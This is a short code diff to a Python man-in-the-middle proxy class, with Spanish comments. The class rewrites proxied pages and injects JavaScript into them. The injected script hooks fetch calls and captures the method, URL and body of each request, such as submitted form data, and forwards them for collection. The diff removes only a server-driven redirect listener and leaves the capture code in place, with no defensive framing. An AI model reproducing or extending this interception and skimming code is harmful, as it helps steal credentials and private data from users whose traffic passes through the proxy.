@@ -474,7 +474,7 @@ class MITMProxy:
         return self._url_replace(self._dec(body, enc)).encode('utf-8', errors='replace')
 
     # ===========================================================
-    #  JS INYECTADO (CODIGO ORIGINAL)
+    #  JS INYECTADO (FIXED - SIN __redir__)
     # ===========================================================
     def _inject_js(self):
         return '''<script>
@@ -506,9 +506,6 @@ if(typeof o.body==="string")s=o.body;
 else if(o.body instanceof URLSearchParams)s=o.body.toString();
 if(s)P({t:"h",m:o.method,u:typeof u==="string"?u:"",b:s});}catch(e){}}
 return F.apply(this,arguments);};}
-
-var es=new EventSource("/__redir__");
-es.onmessage=function(e){if(e.data){window.location.href=e.data;es.close();}};
 })();
 </script>'''
 
